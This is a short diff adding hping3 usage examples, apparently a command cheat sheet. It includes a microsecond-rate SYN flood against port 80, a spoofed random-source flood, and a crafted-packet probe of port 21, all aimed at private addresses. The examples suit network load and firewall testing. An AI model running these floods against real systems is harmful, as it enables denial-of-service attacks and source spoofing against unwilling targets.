@@ -1,0 +1,9 @@
+# run TCP SYN flood against port 80 of given host at 1/us packet rate
+hping3 -i u1 -S -p 80 192.168.0.25
+
+# run 10000 packets in 'flood' mode (as fast as possible)
+# with random source address
+hping3 --flood -c 10000 --rand-source 172.16.0.22
+
+# run packets with TCP window size of 64 and length of 120 against port 21
+hping3 -w 64 -d 120 -p 21 172.16.0.100
